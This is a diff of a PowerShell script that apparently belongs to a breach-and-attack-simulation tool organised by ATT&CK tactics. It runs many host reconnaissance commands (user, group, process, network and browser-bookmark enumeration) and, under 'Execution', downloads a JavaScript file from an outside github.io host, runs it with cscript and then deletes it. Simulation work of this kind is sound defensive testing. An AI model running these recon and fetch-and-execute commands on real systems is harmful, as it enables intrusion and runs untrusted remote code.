@@ -1,5 +1,64 @@
-#Testing
+#------------------------------------------------------------------------
+# FOlder Prerequistes
+$BasePath = "C:\SISAONE_BAS"
 
-whoami > C:\temp\whoami.txt
-hostname > C:\temp\hostname.txt
-net user > C:\temp\netuser.txt
+$Folders = @(
+    "Discovery",
+    "Defense Evasion",
+    "Execution",
+    "Persistence",
+    "Impact",
+    "Collection",
+    "Credential Access",
+    "Exfiltration"
+)
+
+if (!(Test-Path $BasePath)) {
+    New-Item -Path $BasePath -ItemType Directory -Force | Out-Null
+}
+
+foreach ($Folder in $Folders) {
+    $FullPath = Join-Path $BasePath $Folder
+    if (!(Test-Path $FullPath)) {
+        New-Item -Path $FullPath -ItemType Directory -Force | Out-Null
+    }
+}
+#--------------------------------------------------------------------------
+# Discovery
+
+cmd /c whoami > C:\SISAONE_BAS\Discovery\Whoami_output.txt
+cmd /c net user > C:\SISAONE_BAS\Discovery\net_user_output.txt
+cmd /c net localgroup > C:\SISAONE_BAS\Discovery\net_localgroup_output.txt
+cmd /c wmic useraccount list full > C:\SISAONE_BAS\Discovery\wmic_useraccount_list_full_output.txt
+cmd /c wmic group list full > C:\SISAONE_BAS\Discovery\wmic_group_list_full_output.txt
+cmd /c tasklist > C:\SISAONE_BAS\Discovery\tasklist_output.txt
+cmd /c wmic process list full > C:\SISAONE_BAS\Discovery\wmic_process_list_full_output.txt
+cmd /c sc query > C:\SISAONE_BAS\Discovery\sc_query_output.txt
+cmd /c tasklist /svc > C:\SISAONE_BAS\Discovery\tasklist_svc_output.txt
+cmd /c net start > C:\SISAONE_BAS\Discovery\net_start_output.txt
+cmd /c wmic service list full > C:\SISAONE_BAS\Discovery\wmic_service_list_full_output.txt
+cmd /c netsh advfirewall show allprofiles > C:\SISAONE_BAS\Discovery\netsh_advfirewall_show_allprofiles_output.txt
+cmd /c ipconfig /displaydns > C:\SISAONE_BAS\Discovery\ipconfig_displaydns_output.txt
+cmd /c ipconfig /all > C:\SISAONE_BAS\Discovery\ipconfig_all_output.txt
+cmd /c netstat -na > C:\SISAONE_BAS\Discovery\netstat_na_output.txt
+cmd /c arp -a > C:\SISAONE_BAS\Discovery\arp_a_output.txt
+cmd /c net session > C:\SISAONE_BAS\Discovery\net_session_output.txt
+cmd /c wmic product get name,version > C:\SISAONE_BAS\Discovery\wmic_product_get_name_version_output.txt
+cmd /c systeminfo > C:\SISAONE_BAS\Discovery\systeminfo_output.txt
+cmd /c net share > C:\SISAONE_BAS\Discovery\net_share_output.txt
+cmd /c where /R C:\Users\ Bookmarks > C:\SISAONE_BAS\Discovery\T1217_Google_Bookmark_output.txt
+cmd /c where /R C:\Users\ places.sqlite > C:\SISAONE_BAS\Discovery\T1217_firefox_Bookmark_output.txt
+cmd /c dir /s /b %USERPROFILE%\Favorites > C:\SISAONE_BAS\Discovery\T1217_Bookmark_output.txt
+cmd /c Dependencies\T1010.exe > C:\SISAONE_BAS\Discovery\T1010_output.txt
+
+# EXECUTION
+
+Invoke-WebRequest -Uri "https://darkydeliver.github.io/sysinfo/sysinfo.js" -OutFile "C:\SISAONE_BAS\Execution\sysinfo.js"; Start-Process -FilePath "cmd.exe" -ArgumentList "/c cscript C:\SISAONE_BAS\Execution\sysinfo.js > C:\SISAONE_BAS\Execution\sysinfo_js_output.txt" -Wait; Remove-Item "C:\SISAONE_BAS\Execution\sysinfo.js"
+cmd /c echo Executes a command in the Windows Command Shell to write a message > C:\SISAONE_BAS\Execution\SputnikBAS_Suspicious_Execution_via_Windows_Command_Shell.txt
+cmd /c echo Writes text to a file and display the results > C:\SISAONE_BAS\Execution\Drop_file_output.txt
+for /l %x in (1,1,1) do start wordpad.exe /p C:\SISAONE_BAS\Execution\WMI_software_output.txt; Stop-Process -Name wordpad -Force -ErrorAction SilentlyContinue
+cmd /c wmic process get caption,executablepath,commandline /format:csv > C:\SISAONE_BAS\Execution\WMI_process_output.txt
+cmd /c wmic useraccount get /ALL /format:csv > C:\SISAONE_BAS\Execution\WMI_users_output.txt
+cmd /c wmic qfe get description,installedOn /format:csv > C:\SISAONE_BAS\Execution\WMI_software_output.txt
+
+#-----------------------------------------------------------------------
